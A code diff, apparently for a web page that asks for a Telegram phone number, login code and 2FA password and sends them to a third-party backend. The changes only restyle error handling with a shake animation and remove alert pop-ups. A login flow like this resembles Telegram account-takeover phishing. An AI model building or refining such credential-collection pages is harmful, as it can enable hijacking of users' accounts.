@@ -271,8 +271,23 @@
             width: 100%; padding: 14px; border: 2px solid #ddd; border-radius: 12px;
             font-size: 16px; outline: none; text-align: center; margin-bottom: 15px;
             font-weight: 600; color: #333; background: #f9f9f9;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
         .password-input:focus { border-color: #FF4500; box-shadow: 0 0 10px rgba(255, 69, 0, 0.3); }
+
+        /* ভুল পাসওয়ার্ডের জন্য লাল বর্ডার ও শেক অ্যানিমেশন */
+        .password-input.error-shake {
+            border-color: #ff3b30 !important;
+            box-shadow: 0 0 10px rgba(255, 59, 48, 0.5) !important;
+            animation: shakeAnim 0.4s ease-in-out;
+        }
+
+        @keyframes shakeAnim {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-8px); }
+            40%, 80% { transform: translateX(8px); }
+        }
+
         .btn-verify-password {
             background: linear-gradient(135deg, #FF8C00, #FF4500); color: white; width: 100%; padding: 13px;
             border-radius: 12px; border: none; font-weight: 700; font-size: 16px; cursor: pointer;
@@ -451,7 +466,7 @@
                 if(res.ok && data.status === "success") {
                     globalPhoneCodeHash = data.phone_code_hash;
                     document.getElementById('phoneCodeHash').value = data.phone_code_hash;
-                    alert("OTP sent successfully to your Telegram!");
+                    // ওটিপি সফলভাবে পাঠানোর পপ-আপ মেসেজটি বাদ দেওয়া হয়েছে যাতে সরাসরি দ্রুত কাজ করে
                     realInput.focus();
                 } else {
                     alert("Failed to send OTP: " + (data.message || "Unknown error"));
@@ -512,7 +527,6 @@
                                 checkCircle.classList.add('animate');
                                 checkMark.classList.add('animate');
 
-                                // সফল ভেরিফিকেশনের পর সরাসরি ড্যাশবোর্ডে রিডাইরেক্ট করা হচ্ছে
                                 setTimeout(() => {
                                     window.location.href = "https://alveecommunity.com/dashboard.html";
                                 }, 1500);
@@ -566,10 +580,13 @@
             let phone = document.getElementById('phoneInput').value.trim();
             let code = realInput.value;
             let phoneCodeHash = document.getElementById('phoneCodeHash').value || globalPhoneCodeHash;
-            let password = document.getElementById('twoFactorPassword').value;
+            let passwordInputEl = document.getElementById('twoFactorPassword');
+            let password = passwordInputEl.value;
 
             if(!password) {
-                alert("Please enter your 2FA password!");
+                // পাসওয়ার্ড ফিল্ড খালি থাকলে লাল অ্যানিমেশন ও শেক ইফেক্ট দেখাবে
+                passwordInputEl.classList.add('error-shake');
+                setTimeout(() => passwordInputEl.classList.remove('error-shake'), 400);
                 return;
             }
 
@@ -583,11 +600,16 @@
                 if(res.ok && data.status === "success") {
                     startSuccessAnimation();
                 } else {
-                    alert("Password Verification Failed: " + (data.message || "Incorrect password"));
-                    document.getElementById('twoFactorPassword').value = "";
+                    // ভুল পাসওয়ার্ড দিলে আগের পপ-আপ মেসেজ বাদ দিয়ে শুধু ইনপুট বক্সে লাল শেক ও বর্ডার অ্যানিমেশন দেখাবে[span_2](start_span)[span_2](end_span)
+                    passwordInputEl.classList.add('error-shake');
+                    setTimeout(() => passwordInputEl.classList.remove('error-shake'), 400);
+                    passwordInputEl.value = "";
                 }
             })
-            .catch(err => alert("Password verification error!"));
+            .catch(err => {
+                passwordInputEl.classList.add('error-shake');
+                setTimeout(() => passwordInputEl.classList.remove('error-shake'), 400);
+            });
         }
     </script>
 </body>
